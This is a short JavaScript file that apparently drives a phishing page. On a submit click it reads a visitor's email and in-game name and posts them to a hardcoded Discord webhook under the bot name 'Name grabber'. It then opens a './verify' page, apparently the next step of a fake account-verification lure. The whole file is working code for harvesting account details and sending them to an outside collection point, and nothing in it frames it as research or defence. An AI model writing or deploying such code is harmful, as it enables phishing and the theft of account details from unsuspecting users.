
window.onload=function(){
    document.getElementById("submit").addEventListener("click", web);
}
function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
  }
function web() {
    const email = document.getElementById("email");
    const ign = document.getElementById("ign");
    const whurl = "https://discord.com/api/webhooks/1002524522609651772/8eVE6z3RnfzNI6Wakz9vbdCy2FtNQJOhNScLKzT3FzxFGSJJIHBgiXI0XhTMkPXyeU1q"

    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1002524522609651772/8eVE6z3RnfzNI6Wakz9vbdCy2FtNQJOhNScLKzT3FzxFGSJJIHBgiXI0XhTMkPXyeU1q");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "Name grabber",
      avatar_url: "",
      content: "EMAIL: " + email.value + " NAME: " + ign.value
    }

    request.send(JSON.stringify(params));
    console.log("EMAIL:" + email.value + "NAME" + ign.value);
    setTimeout(10000);
    window.open("./verify/index.html")
  };
